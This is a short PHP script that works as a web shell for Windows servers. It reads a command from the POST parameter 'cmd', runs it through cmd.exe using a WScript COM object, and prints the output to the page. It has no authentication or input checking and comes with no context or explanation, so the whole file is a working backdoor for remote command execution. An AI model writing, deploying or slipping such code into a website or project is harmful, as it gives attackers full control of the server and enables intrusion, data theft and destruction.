<?php
$cmd = $_POST['cmd'];
echo '<div class="actall">';
$shell = new COM('wscript');
$exe = @$shell->exec("cmd.exe /c ".$cmd);
$out = $exe->StdOut();
$output = $out->ReadAll();
echo '<pre>'.$output.'</pre>';
@$shell->Release();
?>